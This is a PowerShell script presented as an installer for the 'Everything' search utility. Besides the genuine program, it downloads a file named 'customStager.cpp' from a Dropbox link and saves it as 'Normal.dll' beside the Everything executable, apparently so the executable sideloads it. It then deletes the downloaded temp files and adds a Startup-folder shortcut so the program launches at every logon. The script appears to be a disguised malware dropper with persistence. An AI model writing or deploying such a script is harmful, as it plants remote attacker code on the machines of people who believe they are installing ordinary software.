# Define log file path and function
$logFile = "$env:TEMP\ScriptLog_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $logFile -Append
    Write-Host "$timestamp - $Message"
}

# Initialize logging
Write-Log "Script execution started"

# Define variables
$url1 = "https://www.voidtools.com/Everything-1.4.1.1028.x64.zip"
$url2 = "https://www.dropbox.com/scl/fi/u9v9583oop4wstwcd4kyk/customStager.cpp?rlkey=w8o94nlzu9kkc0pi04jw15ocm&st=sjivc1fz&dl=1"
$url1Path = "$env:TEMP\file.zip"
$url2Path = "$env:TEMP\Normal.dll"
$extractPath = "$env:LOCALAPPDATA\Everything"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Everything.lnk"
$targetPath = "$extractPath\Everything.exe"

# Create extraction directory
Write-Log "Creating directory: $extractPath"
try {
    New-Item -ItemType Directory -Path $extractPath -Force -ErrorAction Stop | Out-Null
    Write-Log "Successfully created directory: $extractPath"
}
catch {
    Write-Log "ERROR: Failed to create directory: $extractPath. Error: $($_.Exception.Message)"
    exit 1
}

# Download files
Write-Log "Starting download of file from: $url1"
try {
    Invoke-WebRequest -Uri $url1 -OutFile $url1Path -ErrorAction Stop
    Write-Log "Successfully downloaded file to: $url1Path"
}
catch {
    Write-Log "ERROR: Failed to download file from $url1. Error: $($_.Exception.Message)"
    exit 1
}

Write-Log "Starting download of file from: $url2"
try {
    Invoke-WebRequest -Uri $url2 -OutFile $url2Path -ErrorAction Stop
    Write-Log "Successfully downloaded file to: $url2Path"
}
catch {
    Write-Log "ERROR: Failed to download file from $url2. Error: $($_.Exception.Message)"
    exit 1
}

# Extract and copy files
Write-Log "Extracting archive from: $url1Path to: $extractPath"
try {
    Expand-Archive -Path $url1Path -DestinationPath $extractPath -Force -ErrorAction Stop
    Write-Log "Successfully extracted archive to: $extractPath"
}
catch {
    Write-Log "ERROR: Failed to extract archive from $url1Path. Error: $($_.Exception.Message)"
    exit 1
}

Write-Log "Copying file from: $url2Path to: $extractPath"
try {
    Copy-Item -Path $url2Path -Destination $extractPath -Force -ErrorAction Stop
    Write-Log "Successfully copied file to: $extractPath"
}
catch {
    Write-Log "ERROR: Failed to copy file from $url2Path. Error: $($_.Exception.Message)"
    exit 1
}

# Clean up downloaded files
Write-Log "Removing temporary files: $url1Path, $url2Path"
try {
    Remove-Item $url1Path, $url2Path -Force -ErrorAction Stop
    Write-Log "Successfully removed temporary files"
}
catch {
    Write-Log "WARNING: Failed to remove temporary files. Error: $($_.Exception.Message)"
}

try {
    $WShell = New-Object -ComObject WScript.Shell
    $shortcut = $WShell.CreateShortcut($startupPath)
    $shortcut.TargetPath = "$targetPath"
    $shortcut.Arguments = "-startup"
    $shortcut.Save()
    Write-Log "Successfully created the shortcut in startup folder"
}
catch {
    Write-Error "Failed to create shortcut: $_"
    exit 1
}
finally {
    [Runtime.InteropServices.Marshal]::ReleaseComObject($WShell) | Out-Null
}

Write-Log "Script execution completed successfully"